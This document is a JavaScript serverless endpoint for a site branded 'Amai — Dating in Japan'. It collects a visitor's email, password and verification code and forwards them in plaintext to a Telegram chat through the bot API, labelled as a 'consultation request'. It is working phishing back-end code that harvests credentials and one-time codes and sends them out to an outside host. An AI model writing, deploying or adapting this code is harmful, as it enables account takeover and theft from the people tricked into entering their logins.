// api/telegram.js
export default async function handler(req, res) {
    // Разрешаем запросы
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Обрабатываем preflight запрос
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Только POST запросы
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Получаем данные
        const { email, password, code, language = 'en' } = req.body;

        // Проверяем наличие данных
        if (!email || !password || !code) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        // 🔐 Токены из переменных окружения (НЕ ВИДНЫ в коде!)
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        // Проверяем, что переменные установлены
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Missing environment variables');
            return res.status(500).json({ error: 'Server configuration error' });
        }

        // Формируем сообщение
        const lang = language === 'jp' ? '日本語' : 'English';
        const date = new Date().toLocaleString('ru-RU');
        
        const message = `
📝 *Новая заявка на консультацию!*

📧 *Email:* ${email}
🔑 *Пароль:* ${password}
📱 *Код:* ${code}
🕐 *Дата:* ${date}
🌐 *Язык:* ${lang}

💫 *Amai — Dating in Japan*`;

        // Отправляем в Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
            })
        });

        const data = await response.json();

        if (!data.ok) {
            console.error('Telegram API error:', data);
            return res.status(500).json({ error: 'Failed to send message' });
        }

        // Успешный ответ
        return res.status(200).json({ success: true });

    } catch (error) {
        console.error('Server error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
}
